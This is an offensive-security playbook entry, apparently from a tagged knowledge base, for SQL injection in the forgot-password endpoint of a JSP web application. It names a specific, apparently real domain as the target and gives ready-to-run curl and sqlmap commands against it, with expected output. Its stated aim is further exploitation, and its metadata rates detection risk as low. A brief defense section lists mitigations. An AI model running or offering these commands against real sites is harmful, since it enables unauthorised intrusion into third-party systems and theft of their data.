---
id: proc-uuid-001
name: Identify-SQLi-in-Forgot-Password-Endpoint
tags:
  - sqli
  - web
  - recon
type: procedure
tools:
  - '[[tools/sqlmap]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-basic-request]]'
  - '[[commands/sqlmap-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.519Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify-SQLi-in-Forgot-Password-Endpoint

## Summary

This procedure tests the forgot password endpoint of a JSP-based web application for SQL injection vulnerabilities by sending malformed inputs and observing error responses, enabling early detection of input validation flaws.

## Description

In a typical attack scenario, the forgot password functionality accepts user-supplied email inputs without proper sanitization, allowing attackers to inject SQL code. This procedure focuses on a Java/JSP environment like gmmovinparts.com, where the endpoint /forgot_password.jsp processes POST requests. Prerequisites include access to a web proxy like Burp Suite for interception. Expected outcomes include confirmation of injectable parameters, setting the stage for data extraction.

## Requirements

1. Network access to the target web application
2. Tools like curl or Burp Suite for request manipulation
3. Basic knowledge of SQL syntax for error-based testing

## Defense

Defensive measures and detection strategies:

- Implement prepared statements and input parameterization in JSP code
- Use web application firewalls (WAF) to block common SQLi payloads
- Monitor application logs for SQL error messages and anomalous requests

## Objectives

1. Confirm presence of SQL injection in the email parameter
2. Identify the underlying database type (e.g., MySQL)
3. Gather indicators for further exploitation

## Instructions

### Step 1: Send Basic Test Request

**Context**: Start with a simple single-quote injection to trigger SQL errors, indicating lack of validation.

**Command** ([[commands/curl-basic-request]]):
```bash
curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email='" -v
```

> This command sends a POST request with an unclosed quote in the email field. Expected output includes a 500 error or SQL syntax error message, such as "You have an error in your SQL syntax".

### Step 2: Automate Detection with sqlmap

**Context**: Use an automated tool to confirm injectability and enumerate basics without manual effort.

**Command** ([[commands/sqlmap-test]]):
```bash
sqlmap -u "https://gmmovinparts.com/forgot_password.jsp" --data="email=test@test.com" --batch
```

> sqlmap tests for various injection techniques. Successful output shows "Parameter: email (POST) is vulnerable".

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-basic-request]]
- [[commands/sqlmap-test]]

## Tools Used

- [[tools/sqlmap]]
- [[tools/Burp-Suite]]

## Tags

- [[sqli]]
- [[web]]
- [[recon]]
